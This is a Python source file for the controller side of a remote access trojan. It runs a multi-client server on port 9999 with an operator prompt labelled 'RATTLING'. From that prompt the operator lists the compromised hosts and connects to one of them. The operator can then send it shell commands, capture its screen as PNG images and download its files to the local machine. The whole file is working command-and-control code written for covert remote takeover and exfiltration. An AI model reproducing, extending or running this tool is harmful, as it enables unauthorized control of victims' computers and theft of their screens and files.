import socket
import threading
import time
import sys
from queue import Queue
import struct
import signal
from mss import mss, tools
from termcolor import colored
import os
from colorama import init


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()

COMMANDS = {'help':['THIS'],
            'live':['Lists all live clients'],
            'connect':['Connect to a live client by typing "connect:id'],
            'shutdown':['Shuts server down'],
            'quit':['Terminates connection to current client'],

           }

class MultiServer(object):

    def __init__(self):

        self.host = ''
        self.port = 9999
        self.socket = None
        self.all_connections = []
        self.all_addresses = []
        init() #Color form cross platform

    def print_help(self):
        for cmd, v in COMMANDS.items():
            print("{0}:\t{1}".format(cmd, v[0]))
        return

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        for conn in self.all_connections:
            try:
                conn.shutdown(2)
                conn.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
                # continue
        self.socket.close()
        sys.exit(0)

    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return

    def socket_bind(self):
        """ Bind socket to port and wait for connection from client """
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as e:
            print("Socket binding error: " + str(e))
            time.sleep(5)
            self.socket_bind()
        return

    def accept_connections(self):
        """ Accept connections from multiple clients and save to list """
        for c in self.all_connections:
            c.close()
        self.all_connections = []
        self.all_addresses = []
        while 1:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                client_hostname = conn.recv(1024).decode("utf-8")
                address = address + (client_hostname,)
            except Exception as e:
                print('Error accepting connections: %s' % str(e))
                # Loop indefinitely
                continue
            self.all_connections.append(conn)
            self.all_addresses.append(address)
            print('\nConnection has been established: {0} ({1})'.format(address[-1], address[0]))
            sys.stdout.write(colored('\n-->> ', 'red', attrs=['bold']))
        return

    def start_turtle(self):
        """ Interactive prompt for sending commands remotely """
        sys.stdout.write(colored("RATTLING", 'blue', attrs=["bold"]))
        while True:
            sys.stdout.write(colored('\n-->> ', 'red', attrs=['bold']))
            cmd = input()

            if cmd == 'live':
                self.list_connections()
                continue
            elif 'connect' in cmd:
                target, conn = self.get_target(cmd)
                if conn is not None:
                     self.send_target_commands(target, conn)
            elif cmd == 'shutdown':
                    queue.task_done()
                    queue.task_done()
                    print('Server shutdown')
                    break
                    # self.quit_gracefully()
            elif cmd == 'help':
                self.print_help()
            elif cmd == '':
                pass
            else:
                print('Command not recognized')
        return

    def list_connections(self):
        """ List all connections """
        results = ''
        for id, conn in enumerate(self.all_connections):
            try:
                conn.send(str.encode(' ')) #Ping for live hosts
                conn.recv(20480)
            except:
                del self.all_connections[id] #Remove offlin hosts
                del self.all_addresses[id]
                continue
            results += str(id) + '   ' + str(self.all_addresses[id][0]) + '   ' + str(
                self.all_addresses[id][1]) + '   ' + str(self.all_addresses[id][2]) + '\n'
        print('----- Clients -----' + '\n' + results)
        return

    def get_target(self, cmd):
        target = cmd.split(' ')[-1]
        try:
            target = int(target)
        except:
            print('Client index should be an integer')
            return None, None
        try:
            conn = self.all_connections[target]
        except IndexError:
            print('Not a valid selection')
            return None, None
        print("You are now connected to " + str(self.all_addresses[target][2]) + " on: " + str(self.all_addresses[target][0]))
        return target, conn


    def read_command_output(self, conn):
        """ Read message length and unpack it into an integer
        :param conn:
        """
        raw_msglen = self.recvall(conn, 4)
        if not raw_msglen:
            return None
        try:
            msglen = struct.unpack('>I', raw_msglen)[0]
        except:
            msglen = struct.calcsize('ii') #Size of two integers for screensize! 
        print("The response contained: " + str(msglen) + " bytes")
        # Read the message data
        return self.recvall(conn, msglen)

    def recvall(self, conn, n):
        """ Helper function to recv n bytes or return None if EOF is hit
        :param n:
        :param conn:
        """
        # TODO: this can be a static method
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def save_file(self, client_response, filetosave):
        file = client_response
        try:
            f = open(filetosave, 'wb')
            f.write(file)
            # f.write(bytearray(file))
            f.close()
        except Exception as e:
            print("Did you forget to put a filename with your call?" + e)
        return

    def send_target_commands(self, target, conn):
        """ Connect with remote target client
        :param conn:
        :param target:
        """
        try: #PING IF LIVE
            conn.send(str.encode(" "))
            cwd_bytes = self.read_command_output(conn)
            cwd = str(cwd_bytes, "utf-8")
            cwd.split("$-?")
        except:
            cwd = '***'
            
        try: #Recv valuable data from client
            mon_size_bytes = self.read_command_output(conn)
            #print(mon_size_bytes)
            mon_size = str(mon_size_bytes, "utf-8")
            width, height = mon_size.split()
            mon_tuple = (int(width), int(height))
            print('Monitor size is: ' + mon_size)
        except:
            print('Failed getting monitor size from client')
            pass
        sys.stdout.write(colored(cwd, 'red', attrs=['bold']))
        dir = cwd
        cmd = ''

        while True:
            if cmd == 'quit':
                del self.all_connections[target]
                del self.all_addresses[target]
                break
            if cmd == '':
                pass
            try:
                cmd = input()
                if len(str.encode(cmd, 'utf-8')) > 0:
                    conn.send(str.encode(cmd))
                    print('Fetching response...')
                    output = self.read_command_output(conn)
                    if cmd == 'quit':
                        break
                    try: #If response is text
                        client_response = str(output, "utf-8")
                        msg, dir = client_response.split("$-?")
                    except: #If response is not text
                        client_response = output
                        cmd_part, filetosave = cmd.split()
                        if(cmd_part == 'sc'): #If response is not text and command contained sc (screenshot)
                            tools.to_png(client_response, mon_tuple, filetosave) #Svae img_with mon_tuple for size from on connect
                            
                        elif(cmd_part == 'put'):
                            pass
                        
                        else: #If it was a request for a file. TODO: Add if cmd == 'get'
                            self.save_file(client_response, filetosave)
                        msg = "Done!\n"
                        #dir = '\nFiles will be saved in your working directory!>'
                    try:
                        sys.stdout.write(msg)
                        sys.stdout.write(colored(dir, 'red', attrs=['bold']))
                    except Exception as e:
                        print("Could not print result...")

            except Exception as e:
                print("Connection was lost (Please check if the client is live and reconnect) %s" %str(e))
                #sys.stdout.write(colored(dir, 'red', attrs=['bold']))
                break
        del self.all_connections[target]
        del self.all_addresses[target]
        return


def create_workers():
    """ Create worker threads (will die when main exits) """
    server = MultiServer()
    server.register_signal_handler()
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()
    return


def work(server):
    """ Do the next job in the queue (thread for handling connections, another for sending commands)
    :param server:
    """
    while True:
        x = queue.get()
        if x == 1:
            server.socket_create()
            server.socket_bind()
            server.accept_connections()
        if x == 2:
            server.start_turtle()
        queue.task_done()
    return

def create_jobs():
    """ Each list item is a new job """
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
    return

def main():
    create_workers()
    create_jobs()


if __name__ == '__main__':
    main()
